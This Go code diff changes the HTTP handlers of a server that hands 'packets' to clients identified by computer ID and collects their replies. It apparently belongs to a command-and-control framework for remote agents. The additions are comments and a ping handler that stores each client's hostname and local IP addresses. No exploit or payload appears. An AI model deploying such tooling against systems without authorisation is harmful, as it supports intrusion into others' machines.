@@ -7,10 +7,12 @@ import (
 	"net/http"
 	"os"
 
+	"github.com/dobin/antnium/model"
 	"github.com/gorilla/mux"
 	log "github.com/sirupsen/logrus"
 )
 
+// getPacket provides a client with new packets, if any
 func (s *Server) getPacket(rw http.ResponseWriter, r *http.Request) {
 	vars := mux.Vars(r)
 	computerId := vars["computerId"]
@@ -40,6 +42,7 @@ func (s *Server) getPacket(rw http.ResponseWriter, r *http.Request) {
 	fmt.Fprint(rw, string(jsonData))
 }
 
+// sendPacket receives packet answers from client
 func (s *Server) sendPacket(rw http.ResponseWriter, r *http.Request) {
 	reqBody, err := ioutil.ReadAll(r.Body)
 	if err != nil {
@@ -57,6 +60,10 @@ func (s *Server) sendPacket(rw http.ResponseWriter, r *http.Request) {
 
 	s.clientInfoDb.updateFor(packet.ComputerId, r.RemoteAddr)
 
+	if packet.PacketType == "ping" {
+		s.handlePingPacket(packet)
+	}
+
 	packetInfo, err := s.packetDb.update(packet)
 	if err == nil {
 		// only broadcast if element has been found (against ping-packet spam)
@@ -64,6 +71,14 @@ func (s *Server) sendPacket(rw http.ResponseWriter, r *http.Request) {
 	}
 
 	fmt.Fprint(rw, "asdf")
+}
+
+func (s *Server) handlePingPacket(packet model.Packet) {
+
+	hostname, _ := packet.Response["hostname"]
+	localIps := model.ResponseToArray("localIp", packet.Response)
+
+	s.clientInfoDb.updateMore(packet.ComputerId, hostname, localIps)
 }
 
 func (s *Server) uploadFile(w http.ResponseWriter, r *http.Request) {
